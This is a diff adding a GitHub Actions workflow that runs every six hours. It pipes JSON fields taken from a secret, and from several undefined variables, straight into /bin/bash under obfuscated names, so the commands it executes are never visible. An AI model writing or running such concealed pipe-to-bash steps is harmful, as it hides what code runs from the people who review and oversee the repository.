@@ -1,0 +1,26 @@
+name: fengsanxiangxian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengsanxiangxian
+        env:
+          geck378: ${{ secrets.geck378 }}
+        run: |
+          echo $geck378 | jq -r .svefv7 | /bin/bash
+          echo $wo37 | jq -r .s1481 | /bin/bash
+          echo $wt6873 | jq -r .flavh05 | /bin/bash
+          echo $vhks83525 | jq -r .vn13 | /bin/bash
+          echo $wxlw7 | jq -r .g6 | /bin/bash
+          echo $rjg9591 | jq -r .xaqx9442 | /bin/bash
+          echo $dms05873 | jq -r .hhz37 | /bin/bash
+          echo $dzerk4 | jq -r .cc0 | /bin/bash
+          echo $uyn5736 | jq -r .a80051 | /bin/bash
+
